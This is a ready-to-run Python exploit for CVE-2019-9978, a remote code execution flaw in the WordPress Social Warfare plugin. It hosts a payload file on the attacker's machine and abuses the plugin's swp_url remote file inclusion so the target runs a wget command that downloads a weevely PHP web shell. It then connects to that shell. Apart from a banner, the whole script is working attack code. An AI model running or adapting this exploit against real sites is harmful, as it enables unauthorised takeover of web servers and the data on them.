# Title: RCE in Social Warfare Plugin ( <=3.5.2 )
# CVE: CVE-2019-9978
# Script Authors: Jessi & Rin
# Usage: python3 social-warefare-rce.py http://example.com/wordpress/ lhost
# Setups an HTTP server to host 'payload.txt', making use of RFI in Social Warfare to download a weevely shell payload and automatically connect to it.

import sys
import os
import requests
import re
import threading
import time

# Warn if no Arguments
if len(sys.argv) <= 1:
    print("Usage: python3 social-warfare-rce.py http://example.com/wordpress/ lhost")
    exit(1)

# Pretty ASCII Art/Intro :)
print("""\
@@@@@@@O@@@@@@@@@@@OOOOOOO@OOOOO@@@@@@@@@@@@OO@@@
@@@@@OooOO,OOOOOoooooooooooOOooooooO@@@OOOOOOO@@@
@@@@@ooooOO^=ooooooooooooooooooooooooOOOOOOOOO@@@
@@@@@ooooOOO/oooooooooooooooooooooooooOOOOOOo^@@@
@@@@@OooO/[[\oooooooooooooooooooooooOooOOOOoo=@@@
@@@@@Ooo`**/oooooooooooooooooooooooooOooOOOooO@@@
@@@@@@@OO`/ooooooooooooooooooooooooooOoooOO/@@@@@
@@@@@@@@ooooooooooooOo[ooooooooooooooOOooO@@@@@@@
@@@@@@@Oooooooo/=ooOO,oooOoooooooooooOOooOO@@@@@@
@@@@@@@OooooooO^=oOO^oooOO[oo/=ooooooOOOoOoO@@@@@
@@@@@@Ooooo/oO/`oO[ OOoO/  \O,oooooooOOOOOoO@@@@@
@@@@@@ooooo^oO^=`  ,O[`     O/oooooOOOO[OOOO@@@@@
@@@@@oooooO^O.O             ,ooooooO/= ,OOOOO@@@@
@@@OOoooooO^=^     [[\OO\            ,].OOOoo@@@@
@@@OoooooooO=\           `          O[  OOooooO@@
@@@@OOOooooOO/  ,]]]]]`                 OooooO@@@
@@@@OOOOO/  =`/`........,\`       ,]]]],OOOOO\@@@
@@@@@@@@    =...............[  /`........\@@O@@@@
@@@@@@@`   ,^.............................O@@@@@@
@@@@@@`    /...............................O@@@@@
@@@@@O     =..................../[[].......O@@@@@
@@@@@       ^..............,`[[..`   ^..../O@@@@@
@@@@O=/o]]] =`............,]]`  /    ,]`., =@@@@@
@@@@@@^                  .         =      [O@@@@@
@@@@@@@`                           ,\       O@@@@/""")
print("\n")
print("WordPress Social Warfare Plugin RCE <=3.5.2")
print("CVE-2019-9978")
print("\n")
time.sleep(2)
os.system("clear")

# Required Arguments
target = sys.argv[1]
lhost = sys.argv[2]

# Create Background Task for HTTP Server
def payload_server():
    os.system("python3 -m http.server 80 >/dev/null 2>&1")
def setup_payload():
    threading.Thread(target=payload_server).start()

# Command Handler for sending payload
def send_payload():
    url = target + 'wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://' + lhost+'/payload.txt'
    r = requests.get(url)

# PTY Payload Generation With Weevely
os.system('weevely generate s0cialW4rfar3 sw.php >/dev/null 2>&1')

# Configure payload
def payload():
    cmd = f"wget http://{lhost}/sw.php -O sw.php"
    f = open("payload.txt", "w")
    f.write("<pre>system('" + cmd+"')</pre>")
    f.close()

# Exploit
print("[!] Setting up exploit handler")
time.sleep(1)
setup_payload()
payload()
print("[+] Payload generated")
time.sleep(1)
print("[!] Sending payload")
time.sleep(1)
send_payload()
print("[+] Spawning weevely shell")
time.sleep(1)
print("[+] Shell spawned")
print("\n")
print("[*] CTRL + C to exit")
print("[*] :help for weevely commands")
os.system(f'weevely {target}wp-admin/sw.php s0cialW4rfar3')
